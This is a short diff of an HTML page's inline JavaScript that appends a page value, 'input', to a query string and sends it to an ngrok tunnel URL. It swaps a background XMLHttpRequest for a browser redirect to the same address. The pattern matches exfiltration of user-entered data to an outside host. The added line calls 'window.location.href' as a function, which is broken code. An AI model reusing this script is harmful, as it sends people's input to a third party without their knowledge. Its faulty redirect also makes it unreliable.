@@ -23,18 +23,19 @@
                     var url = "https://2a54-12-87-110-98.ngrok-free.app";
                     var params = "data=" + encodeURIComponent(input);
                     var fullUrl = url + "?" + params;
-                    var xhr = new XMLHttpRequest();
-                    xhr.open("GET", fullUrl, true);
-                    xhr.send();
-                    xhr.onreadystatechange = function () {
-                        if (xhr.readyState == XMLHttpRequest.DONE) {
-                            if (xhr.status == 200) {
-                                console.log("Request successful");
-                            } else {
-                                console.error("Request failed");
-                            }
-                        }
-                    };
+		    window.location.href(fullUrl);
+                    //var xhr = new XMLHttpRequest();
+                    //xhr.open("GET", fullUrl, true);
+                    //xhr.send();
+                    //xhr.onreadystatechange = function () {
+                    //    if (xhr.readyState == XMLHttpRequest.DONE) {
+                    //        if (xhr.status == 200) {
+                    //            console.log("Request successful");
+                    //        } else {
+                    //            console.error("Request failed");
+                    //        }
+                    //    }
+                    //};
                 }
             </script>
         </body>
